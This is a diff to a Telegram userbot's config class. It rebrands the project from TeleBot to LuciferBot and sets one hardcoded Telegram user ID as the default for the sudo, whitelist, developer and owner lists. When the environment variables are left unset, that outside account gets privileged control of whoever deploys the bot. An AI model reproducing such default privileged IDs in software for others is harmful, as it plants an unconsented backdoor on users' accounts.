@@ -1,5 +1,5 @@
-#    TeleBot - UserBot
-#    Copyright (C) 2020 TeleBot
+#    LuciferBot - UserBot
+#    Copyright (C) 2020 LuciferBot
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU Affero General Public License as published by
@@ -34,22 +34,22 @@ class Var(object):
     SUDO_USERS = set(
         int(x) for x in os.environ.get(
             "SUDO_USERS",
-            "1097131648").split())
+            "804329190").split())
     WHITELIST_USERS = set(
         int(x) for x in os.environ.get(
             "WHITELIST_USERS",
-            "832241419").split())
+            "804329190").split())
     BLACKLIST_USERS = set(
         int(x) for x in os.environ.get(
             "BLACKLIST_USERS", "").split())
     DEVLOPERS = set(
         int(x) for x in os.environ.get(
             "DEVLOPERS",
-            "953414679").split())
+            "804329190").split())
     OWNER_ID = set(
         int(x) for x in os.environ.get(
             "OWNER_ID",
-            "719195224").split())
+            "804329190").split())
     SUPPORT_USERS = set(
         int(x) for x in os.environ.get(
             "SUPPORT_USERS", "").split())
